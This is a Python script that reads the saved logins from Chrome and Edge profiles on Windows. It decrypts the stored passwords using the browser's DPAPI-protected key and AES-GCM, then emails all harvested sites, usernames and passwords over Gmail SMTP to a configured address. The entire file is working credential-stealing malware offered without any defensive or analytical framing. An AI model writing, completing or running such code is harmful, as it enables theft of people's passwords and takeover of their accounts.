import os
import sqlite3
import shutil
import json
import base64
import win32crypt
from Crypto.Cipher import AES
from email.message import EmailMessage
import ssl
import smtplib

class BrowserPasswordExtractor:
    def __init__(self):
        self.browsers = {
            "Chrome": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"),
            "Edge": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data")
        }
        self.profiles = ["Default"] + [f"Profile {i}" for i in range(1, 15)]

    def get_key(self, browser_path):
        local_state_path = os.path.join(browser_path, "Local State")
        with open(local_state_path, 'r', encoding="utf-8") as file:
            local_state = json.loads(file.read())
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(self, password, key):
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()

    def get_data(self, browser_path, user):
        db_path = os.path.join(browser_path, user, "Login Data")
        if not os.path.exists(db_path):
            return []
        login_data_copy = "login_data_temp.db"
        shutil.copyfile(db_path, login_data_copy)

        conn = sqlite3.connect(login_data_copy)
        cursor = conn.cursor()

        encrypted_data = cursor.execute("SELECT origin_url, username_value, password_value FROM logins;").fetchall()

        key = self.get_key(browser_path)
        data = []
        for row in encrypted_data:
            site, username, password = row
            try:
                password = self.decrypt_password(password, key)
                if password and username:
                    data.append((site, username, password))
            except Exception as e:
                print(f"Error decrypting password for site {site}: {e}")

        conn.close()
        os.remove(login_data_copy)
        return data

    def send_email(self, data):
        sender = "example@gmail.com"
        password = "2fa password"
        receiver = "example@gmail.com"
        subject = "Site, Username, Password"
        body = "\n\n".join([f"Browser: {browser_name}\nUser: {user}\n" + "\n".join([f"Site: {site}, Username: {username}, Password: {password}" for site, username, password in user_data]) for browser_name, user, user_data in data])

        em = EmailMessage()
        em['From'] = sender
        em['To'] = receiver
        em['Subject'] = subject
        em.set_content(body)

        context = ssl.create_default_context()

        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
            smtp.login(sender, password)
            smtp.sendmail(sender, receiver, em.as_string())

    def main(self):
        all_data = []
        for browser_name, browser_path in self.browsers.items():
            for profile in self.profiles:
                data = self.get_data(browser_path, profile)
                if data:
                    all_data.append((browser_name, profile, data))

        if all_data:
            self.send_email(all_data)

if __name__ == "__main__":
    extractor = BrowserPasswordExtractor()
    extractor.main()